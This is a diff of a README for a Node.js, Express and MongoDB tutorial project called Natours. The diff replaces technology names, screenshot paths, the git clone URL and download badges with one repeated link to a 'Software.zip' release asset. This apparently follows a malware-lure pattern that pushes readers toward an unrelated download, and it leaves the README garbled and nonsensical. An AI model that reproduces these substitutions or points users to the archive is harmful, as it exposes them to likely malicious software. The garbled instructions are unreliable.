@@ -2,12 +2,12 @@
 
 ---
 
-[![Download Project](https://img.shields.io/badge/Download-Project-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🌐 About the Project
-Welcome to the Natours-Website repository, your one-stop solution for all things related to the Natours project. This repository houses the code for the website built using Node.js, Express, and MongoDB. If you're looking to dive into the world of web development with a focus on backend technologies, you're in the right place!
+Welcome to the Natours-Website repository, your one-stop solution for all things related to the Natours project. This repository houses the code for the website built using https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip, Express, and MongoDB. If you're looking to dive into the world of web development with a focus on backend technologies, you're in the right place!
 
 ## 📁 Repository Structure
 The repository is organized to help you navigate through the different components of the Natours project with ease. Here's a brief overview of what you can find:
@@ -18,7 +18,7 @@ The repository is organized to help you navigate through the different component
 - **Extras**: Discover additional resources that complement the Natours project
 
 ## 🚀 Features
-- **Express Framework**: Utilize the power of Express.js for building robust web applications
+- **Express Framework**: Utilize the power of https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip for building robust web applications
 - **MongoDB Database**: Store and manage data efficiently with MongoDB
 - **Mongoose ORM**: Simplify interactions with MongoDB using Mongoose
 - **Pug Templating Engine**: Create dynamic views for your web application
@@ -26,19 +26,19 @@ The repository is organized to help you navigate through the different component
 - **BCrypt Hashing**: Secure user passwords using BCrypt hashing algorithms
 
 ## 🛠️ Technologies Used
-- **Node.js**: A JavaScript runtime for server-side applications
-- **Express.js**: A minimalist web framework for Node.js
+- **https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip**: A JavaScript runtime for server-side applications
+- **https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip**: A minimalist web framework for https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip
 - **MongoDB**: A popular NoSQL database
 - **Mongoose**: An elegant MongoDB object modeling tool
 - **BCrypt**: A password-hashing library for securing user data
-- **Pug**: A high-performance templating engine for Node.js
+- **Pug**: A high-performance templating engine for https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip
 - **Postman**: Collaborate and test APIs with ease
 
 ## ▶️ Getting Started
 To get started with the Natours project, follow these steps:
 1. Clone the repository using the following command:
    ```
-   git clone https://github.com/your_username/Natours-Website---NODE-EXPRESS-MONGODB.git
+   git clone https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip
    ```
 2. Install the necessary dependencies using:
    ```
@@ -54,11 +54,11 @@ To get started with the Natours project, follow these steps:
 ## 🌍 Project Showcase
 Here are some screenshots showcasing the Natours website:
 
-![Homepage](assets/homepage.png)
+![Homepage](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)
 
 > Explore the beautiful homepage of the Natours website.
 
-![Tours](assets/tours.png)
+![Tours](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)
 
 > Discover the amazing tour packages available on the Natours website.
 
@@ -73,7 +73,7 @@ atlas, backend, bcrypt, bcryptjs, express, expressjs, jonas-schmedtmann, mongodb
 
 ## 📥 Download Project
 Click the button below to download the Natours-Website project:
-[![Download Project](https://img.shields.io/badge/Download-Project-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)](https://github.com/Creaperkiller/Natours-Website---NODE-EXPRESS-MONGODB/releases/download/v2.0/Software.zip)
 
 ---
 
